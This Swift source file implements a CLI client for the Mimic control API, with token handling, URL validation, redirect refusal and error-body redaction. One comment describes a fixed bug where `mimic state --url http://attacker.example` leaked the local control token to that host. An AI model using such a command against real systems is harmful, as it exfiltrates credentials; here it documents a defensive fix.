import Domain
import Foundation
#if canImport(FoundationNetworking)
// URLSession lives in FoundationNetworking on Linux, not Foundation. Without this the CLI and the
// tests that speak HTTP do not compile there — and CI runs on Linux.
import FoundationNetworking
#endif

/// Talks to a running Mimic over the loopback control API.
///
/// The CLI is a *client only* — it holds no state, no database, and no server. That is what makes it
/// safe for an agent to call from anywhere: every invocation reads and writes the one live instance,
/// so two commands issued a second apart cannot disagree about the world.
public struct ControlClient: Sendable {

    public let baseURL: URL
    /// The instance's token, read from its discovery file or the environment.
    ///
    /// Internal rather than private so the discovery tests can assert *where a token did and did not
    /// go*, which is the whole of the property worth testing. It stays out of the public surface and
    /// out of every rendered string: a token echoed into an error ends up in terminal scrollback, CI
    /// logs and bug reports.
    let token: String?
    private let exchange: ControlHTTPExchange
    private let timeout: TimeInterval

    public static let maximumTimeoutSeconds: TimeInterval = 3_600

    /// Keeps Foundation's request and resource timers finite and bounded.
    public static func validatedTimeout(_ timeout: TimeInterval) throws -> TimeInterval {
        guard timeout.isFinite, timeout > 0, timeout <= maximumTimeoutSeconds else {
            throw CLIFailure.badArgument("--timeout must be greater than 0 and at most 3600 seconds.")
        }
        return timeout
    }

    /// The production initialiser, which owns the one `URLSession` this client uses.
    public init(baseURL: URL, timeout: TimeInterval = 30, token: String? = nil) throws {
        self.baseURL = try Self.validatedBaseURL(baseURL)
        self.timeout = try Self.validatedTimeout(timeout)
        self.token = token
        let owner = ControlSession(timeout: self.timeout)
        self.exchange = { try await owner.session.data(for: $0) }
    }

    /// The seam under the transport: everything above `exchange` — building the request, attaching
    /// the token, and the five ways `send` can read a reply — is reachable from a test through this.
    ///
    /// Production uses the validated initializer above and an ephemeral session.
    public init(baseURL: URL, token: String? = nil, exchange: @escaping ControlHTTPExchange) {
        self.baseURL = baseURL
        self.token = token
        self.timeout = 30
        self.exchange = exchange
    }

    /// Resolves how to reach an instance: an explicit URL, then the environment, then the discovery
    /// file. Fails with actionable advice rather than a connection error, because "nothing is running"
    /// is by far the most common reason a command cannot proceed.
    ///
    /// The reader is `ControlEndpointDiscovery` in `Domain` — the one implementation of the
    /// discovery contract, shared with the control plane's write side. The CLI used to carry a copy
    /// of its own, and the copy had drifted: it did not honour `MIMIC_CONTROL_FILE`, so an isolated
    /// run's `mimic` went looking for the developer's real instance. `environment` is threaded into
    /// the file search for exactly that reason — the same dictionary decides the destination, the
    /// credential, *and* which file advertises them.
    ///
    /// `discovered` is a parameter so a test can name the file this resolution sees. Left `nil` — as
    /// every production caller leaves it — it reads the search paths the environment names.
    public static func discover(
        explicitURL: String? = nil,
        environment: [String: String] = ProcessInfo.processInfo.environment,
        timeout: TimeInterval = 30,
        discovered: ControlEndpoint? = nil
    ) throws -> ControlClient {
        let timeout = try validatedTimeout(timeout)
        let overrideName: String?
        if explicitURL != nil {
            overrideName = "--url"
        } else if let value = environment[ControlAPI.urlEnvironmentKey], !value.isEmpty {
            overrideName = ControlAPI.urlEnvironmentKey
        } else if let value = environment[ControlAPI.portEnvironmentKey], !value.isEmpty {
            overrideName = ControlAPI.portEnvironmentKey
        } else {
            overrideName = nil
        }

        // Validate an explicit destination before reading a discovery file. A bad override is a
        // usage error, not evidence that no instance is running (or a reason to launch another one).
        let overrideURL: URL?
        if let overrideName {
            guard let url = ControlEndpointDiscovery.resolveBaseURL(
                explicit: explicitURL,
                environment: environment,
                discovered: nil
            ) else {
                throw CLIFailure.badArgument("\(overrideName) does not name a valid control API destination.")
            }
            overrideURL = try validatedBaseURL(url, source: overrideName)
        } else {
            overrideURL = nil
        }

        let endpoint = discovered ?? ControlEndpointDiscovery.discover(environment: environment)
        guard let url = overrideURL ?? ControlEndpointDiscovery.resolveBaseURL(
            explicit: nil,
            environment: [:],
            discovered: endpoint
        ) else {
            throw CLIFailure.noInstance
        }
        return try ControlClient(
            baseURL: url,
            timeout: timeout,
            // Destination and credential decided *together*, which is the whole of the fix. They
            // used to be resolved independently — `resolveBaseURL` returns an explicit `--url`
            // verbatim, `resolveToken` fell back to the local instance's `control.json` — so
            // `mimic state --url http://attacker.example` posted this machine's live control-plane
            // token to that host. See `ControlEndpointDiscovery.namesDiscoveredInstance`.
            token: ControlEndpointDiscovery.resolveToken(
                environment: environment,
                discovered: ControlEndpointDiscovery.namesDiscoveredInstance(url, endpoint)
                    ? endpoint
                    : nil
            )
        )
    }

    public func send(_ command: ControlCommand) async throws -> ControlResponse {
        try Task.checkCancellation()
        var request = URLRequest(url: baseURL.appendingPathComponent("\(ControlAPI.version)/command"))
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        authorize(&request)
        request.httpBody = try ControlCoding.encoder().encode(command)

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await exchange(request)
        } catch {
            if Task.isCancelled || error is CancellationError || (error as? URLError)?.code == .cancelled {
                throw CancellationError()
            }
            throw CLIFailure.unreachable(baseURL: baseURL, underlying: error.localizedDescription)
        }
        try Task.checkCancellation()

        // A refusal envelope first. Mimic answers a refusal with the same
        // `ControlResponse` it answers a success with — a `401` carries `request.unauthorized`, a
        // `409` carries `project.noneOpen` — and that error names the problem far better than a bare
        // status number does. `Output.emit` turns `ok: false` into `.commandFailed`, which exits 4,
        // the code docs/CLI.md pins for "Mimic refused it".
        //
        // This `try?` is a *format probe*, and it is only sound because `ControlResponse.ok` is a
        // non-optional `Bool` on a synthesized decoder: a reply without it cannot decode, so a
        // success here really is evidence the body is an envelope. A probe into an all-Optional type
        // proves nothing — see `ProjectCommand.Import` and `JourneyFile.readSpec`, both of which
        // were accepting the wrong document for exactly that reason. If `ok` ever gains a fallback,
        // this needs a discriminator of its own.
        let status = (response as? HTTPURLResponse)?.statusCode
        if let decoded = try? ControlCoding.decode(ControlResponse.self, from: data) {
            if decoded.ok, let status, !(200..<300).contains(status) {
                if status == 401 { throw CLIFailure.commandFailed(.unauthorized) }
                throw CLIFailure.commandFailed(.invalid(
                    "\(baseURL.absoluteString) answered HTTP \(status) instead of a successful control response.",
                    code: "http.\(status)"
                ))
            }
            return decoded
        }

        // Nothing usable came back — and until now the status was thrown away on the way in, as
        // `(data, _)`. So *everything* that answered on this port without speaking Mimic's envelope
        // arrived as "Unexpected response from Mimic: …": a proxy's `401`, an nginx `502` page, a
        // captive portal's login HTML. That message reads as a decoding bug in this CLI and sends
        // whoever hit it hunting through the wrong module, when the reply had already said exactly
        // what was wrong. The status is the one thing that separates "we were refused" from "the
        // answer was gibberish", so it gets read rather than discarded.
        if status == 401 {
            // Mimic's own wording, because the advice does not depend on who sent the 401: the token
            // is missing or wrong, and the CLI normally reads it out of the instance's control.json.
            // That message names the file and never the value — a token echoed into an error ends up
            // in terminal scrollback, CI logs and bug reports.
            throw CLIFailure.commandFailed(.unauthorized)
        }
        if let status, status < 200 || status >= 300 {
            throw CLIFailure.commandFailed(.invalid(
                "\(baseURL.absoluteString) answered HTTP \(status) with a body this CLI could not "
                    + "read: \(diagnosticPreview(data))",
                code: "http.\(status)"
            ))
        }
        // A 2xx this CLI cannot read really is a decoding problem, and stays one.
        throw CLIFailure.undecodable(diagnosticPreview(data))
    }

    /// True when an instance answers. Used by `mimic app start` to wait for readiness rather than
    /// sleeping a guessed number of seconds.
    ///
    /// A `401` counts as reachable: the instance is up and serving, and reporting "not running" for
    /// what is really a token mismatch would send the user off restarting an app that is already fine.
    /// `send` will then fail with the message that names the actual problem.
    public func isReachable() async -> Bool {
        guard !Task.isCancelled else { return false }
        var request = URLRequest(url: baseURL.appendingPathComponent("\(ControlAPI.version)/health"))
        request.httpMethod = "GET"
        request.timeoutInterval = min(2, timeout)
        authorize(&request)
        do {
            let (_, response) = try await exchange(request)
            let status = (response as? HTTPURLResponse)?.statusCode
            return !Task.isCancelled && (status == 200 || status == 401)
        } catch {
            return false
        }
    }

    private func authorize(_ request: inout URLRequest) {
        guard let token else { return }
        request.setValue(token, forHTTPHeaderField: ControlAPI.tokenHeaderName)
    }

    /// Error pages can echo request headers. Bound terminal output and hide this request's token,
    /// looking just beyond the cutoff so a credential crossing that boundary is also redacted.
    private func diagnosticPreview(_ data: Data) -> String {
        let limit = 4_096
        let count = min(limit, data.count)
        let credential = Data((token ?? "").utf8)
        let lookahead = min(data.count - count, max(0, credential.count - 1))
        let sample = Data(data.prefix(count + lookahead))
        var preview = Data()
        var cursor = 0
        if !credential.isEmpty {
            while cursor < count,
                  let range = sample.range(of: credential, in: cursor..<sample.endIndex),
                  range.lowerBound < count {
                preview.append(sample[cursor..<range.lowerBound])
                preview.append(contentsOf: "[redacted]".utf8)
                cursor = range.upperBound
            }
        }
        if cursor < count { preview.append(sample[cursor..<count]) }

        var truncated = data.count > count || preview.count > limit
        preview = Data(preview.prefix(limit))
        var text = String(data: preview, encoding: .utf8)
        if text == nil, truncated, !preview.isEmpty {
            // A UTF-8 scalar is at most four bytes. Preserve complete scalars when the byte limit
            // cuts one; genuinely invalid upstream bytes still get replacement characters below.
            for removed in 1...min(3, preview.count) {
                if let complete = String(data: preview.dropLast(removed), encoding: .utf8) {
                    text = complete
                    break
                }
            }
        }
        var rendered = ""
        var byteCount = 0
        for scalar in (text ?? String(decoding: preview, as: UTF8.self)).unicodeScalars {
            let escaped: String
            switch scalar.value {
            case 9, 10:
                escaped = String(scalar)
            case 0...31, 127:
                escaped = "\\u{\(String(scalar.value, radix: 16, uppercase: true))}"
            default:
                escaped = String(scalar)
            }
            guard escaped.utf8.count <= limit - byteCount else {
                truncated = true
                break
            }
            rendered += escaped
            byteCount += escaped.utf8.count
        }
        return rendered + (truncated ? "\n[Response body truncated]" : "")
    }

    private static func validatedBaseURL(_ url: URL, source: String = "Control API URL") throws -> URL {
        guard let components = URLComponents(url: url, resolvingAgainstBaseURL: true),
              let scheme = components.scheme?.lowercased(), ["http", "https"].contains(scheme),
              let host = components.host, !host.isEmpty,
              components.port.map({ (1...65_535).contains($0) }) ?? true,
              components.user == nil, components.password == nil,
              components.query == nil, components.fragment == nil else {
            throw CLIFailure.badArgument(
                "\(source) must be an absolute HTTP(S) URL with a host and a valid port, "
                    + "without user information, a query, or a fragment."
            )
        }
        return url.absoluteURL
    }
}

/// One HTTP exchange: hand over a request, get the body and the response back.
///
/// A closure rather than a second protocol, matching how this codebase already injects the one
/// piece a test needs to replace — `ControlEndpointDiscovery.discover(isProcessAlive:)` and
/// `ProjectStore.open(makeOnDisk:makeInMemory:)` are the same shape. It is the narrowest thing that
/// can be substituted to reach `ControlClient.send`'s branches, and it is below all of them, so the
/// decode logic under test is the real one rather than a reimplementation.
public typealias ControlHTTPExchange = @Sendable (URLRequest) async throws -> (Data, URLResponse)

/// `ControlClient` is the production conformance, and the only one that speaks HTTP.
///
/// The three members are already exactly what the protocol asks for, which is the point: the seam was
/// added around the type rather than through it, so no production call path changed on the way in.
extension ControlClient: ControlTransport {}

/// The session retains its delegate until invalidation. Keeping ownership outside that delegate
/// lets the last client copy release the session, including clients discarded by readiness polling.
private final class ControlSession: Sendable {
    let session: URLSession

    init(timeout: TimeInterval) {
        let configuration = URLSessionConfiguration.ephemeral
        configuration.timeoutIntervalForRequest = timeout
        configuration.timeoutIntervalForResource = timeout
        configuration.requestCachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        // A control endpoint has no redirect contract. Never forward its custom token header to
        // another listener, even if URLSession would normally follow that response.
        session = URLSession(
            configuration: configuration,
            delegate: ControlRedirectPolicy(),
            delegateQueue: nil
        )
    }

    deinit {
        session.invalidateAndCancel()
    }
}

private final class ControlRedirectPolicy: NSObject, URLSessionTaskDelegate, @unchecked Sendable {
    func urlSession(
        _ session: URLSession,
        task: URLSessionTask,
        willPerformHTTPRedirection response: HTTPURLResponse,
        newRequest request: URLRequest,
        completionHandler: @escaping (URLRequest?) -> Void
    ) {
        completionHandler(nil)
    }
}

/// Failures that belong to the CLI itself rather than to a command.
public enum CLIFailure: Error, LocalizedError, Equatable {
    case noInstance
    case unreachable(baseURL: URL, underlying: String)
    case undecodable(String)
    case commandFailed(ControlError)
    case badArgument(String)
    case fileUnreadable(path: String, underlying: String)
    /// The local Mimic itself is not usable: not installed where the CLI looked, would not launch, or
    /// the process a discovery file names could not be confirmed or signalled. Nothing the caller
    /// typed is wrong, and no command ever reached an instance.
    case appUnavailable(String)

    public var errorDescription: String? {
        switch self {
        case .noInstance:
            """
            No running Mimic found.
            Start one with `mimic app start` (the GUI) or `mimic daemon start` (headless),
            or point at an instance with MIMIC_CONTROL_URL or --url.
            """
        case let .unreachable(baseURL, underlying):
            "Could not reach Mimic at \(baseURL.absoluteString): \(underlying)"
        case let .undecodable(payload):
            "Unexpected response from Mimic: \(payload)"
        case let .commandFailed(error):
            "\(error.code): \(error.message)"
        case let .badArgument(message):
            message
        case let .fileUnreadable(path, underlying):
            "Could not read \(path): \(underlying)"
        case let .appUnavailable(message):
            message
        }
    }

    /// Exit codes are part of the contract: a script branches on them without parsing output.
    /// `2` means "the command was wrong", `3` means "no instance", `4` means "the command failed".
    ///
    /// Two of these used to sit on the wrong side of that line, in opposite directions. A path the
    /// caller mistyped never leaves the process, so `fileUnreadable` cannot be "Mimic refused it" —
    /// it is the same kind of mistake as a missing selector, and exits 2. A reply this CLI could not
    /// decode is the reverse: the arguments were fine and Mimic answered, just not with anything
    /// usable, so reporting it as bad usage sent a script looking at its own command line.
    ///
    /// `appUnavailable` is the third, and it was the loudest of them. "Could not find Mimic.app.
    /// Looked in: …" and "Could not stop pid N: …" were both `badArgument`, so a script branching on
    /// the code was told the user had mistyped something when what had happened was that Mimic was
    /// not installed, or that the process the discovery file named was gone. It joins `noInstance`
    /// and `unreachable` at `3` rather than claiming a fifth code, because `3` already means "there
    /// is no Mimic to talk to" and these are that same sentence about the world — and because inside
    /// one command, `mimic app start`, the app-was-not-found failure and the app-never-answered
    /// failure (`waitForReadiness`, already `3`) are one condition that was being reported under two
    /// codes. The contract stays at four documented values, so no caller's existing branch has to
    /// learn a new one.
    public var exitCode: Int32 {
        switch self {
        case .badArgument, .fileUnreadable: 2
        case .noInstance, .unreachable, .appUnavailable: 3
        case .commandFailed, .undecodable: 4
        }
    }
}
